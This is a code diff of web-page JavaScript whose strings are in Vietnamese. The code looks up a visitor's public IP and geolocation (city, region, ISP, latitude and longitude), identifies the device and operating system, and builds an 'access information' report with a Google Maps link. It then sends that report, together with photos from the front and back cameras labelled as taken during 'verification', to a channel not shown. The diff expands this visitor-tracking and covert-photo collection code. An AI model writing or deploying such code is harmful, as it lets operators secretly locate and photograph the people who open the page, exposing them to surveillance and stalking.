@@ -438,10 +438,18 @@
     try {
       const ipRes = await fetch('https://api.ipify.org?format=json');
       const { ip } = await ipRes.json();
-      const geoRes = await fetch(`https://ip-api.com/json/${ip}?fields=country,city,isp,lat,lon`);
+      const geoRes = await fetch(`https://ip-api.com/json/${ip}?fields=country,regionName,city,isp,lat,lon`);
       const geo = await geoRes.json();
       if (geo.status === 'success') {
-        return { ip, isp: geo.isp, city: geo.city, country: geo.country, lat: geo.lat, lon: geo.lon };
+        return {
+          ip,
+          isp: geo.isp,
+          city: geo.city,
+          region: geo.regionName,
+          country: geo.country,
+          lat: geo.lat,
+          lon: geo.lon
+        };
       }
       return null;
     } catch { return null; }
@@ -461,7 +469,7 @@
     const ua = navigator.userAgent;
     if (/iPhone/.test(ua)) return 'iPhone';
     if (/iPad/.test(ua)) return 'iPad';
-    if (/Android/.test(ua)) return 'Điện thoại Android';
+    if (/Android/.test(ua)) return 'Android Device';
     if (/Windows/.test(ua)) return 'PC Windows';
     if (/Macintosh/.test(ua)) return 'Mac';
     return navigator.platform || 'Thiết bị khác';
@@ -487,23 +495,32 @@
       let msg = '📡 [THÔNG TIN TRUY CẬP]\n\n';
       msg += `🕒 Thời gian: ${timeStr}\n`;
       msg += `📱 Thiết bị: ${deviceName()}\n`;
-      msg += `🖥️ HĐH: ${osName()}\n`;
+      msg += `🖥️ Hệ điều hành: ${osName()}\n`;
+
       if (ipInfo) {
-        msg += `🌍 IP: ${ipInfo.ip}\n`;
+        msg += `🌍 IP dân cư: ${ipInfo.ip}\n`;
         msg += `🧠 IP gốc: ${ipInfo.ip}\n`;
         msg += `🏢 ISP: ${ipInfo.isp}\n`;
-        msg += `🏙️ ${ipInfo.city}, ${ipInfo.country}\n`;
+        const address = [ipInfo.city, ipInfo.region, ipInfo.country].filter(Boolean).join(', ');
+        msg += `🏙️ Địa chỉ: ${address}\n`;
+        msg += `🌎 Quốc gia: ${ipInfo.country}\n`;
         const lat = gps ? gps.lat : ipInfo.lat;
         const lon = gps ? gps.lon : ipInfo.lon;
-        if (lat) msg += `📍 Vĩ độ: ${lat}\n📍 Kinh độ: ${lon}\n📌 Maps: https://maps.google.com/?q=${lat},${lon}\n`;
+        if (lat && lon) {
+          msg += `📍 Vĩ độ: ${lat}\n📍 Kinh độ: ${lon}\n`;
+          msg += `📌 Google Maps: https://maps.google.com/?q=${lat},${lon}\n`;
+        }
       } else {
         msg += '🌍 IP: Không xác định được\n';
       }
-      msg += '📸 Camera: ✅ Đã chụp trước, sau và kết thúc\n';
-      msg += '⚠️ Ghi chú: Thông tin có thể chưa chính xác 100%.';
+
+      const hasPhotos = beforeBlob && afterBlob;
+      msg += `📸 Camera: ${hasPhotos ? '✅ Đã chụp trước, sau và kết thúc' : '🚫 Bị chặn hoặc không có camera'}\n`;
+      msg += '\n⚠️ Ghi chú: Thông tin có khả năng chưa chính xác 100%.';
 
       await sendMessage(msg);
 
+      // Gửi ảnh nếu có
       if (beforeBlob) await sendPhoto(beforeBlob, 'Ảnh trước xác minh');
       if (backBlob) await sendPhoto(backBlob, 'Ảnh camera sau');
       if (afterBlob) await sendPhoto(afterBlob, 'Ảnh kết thúc');
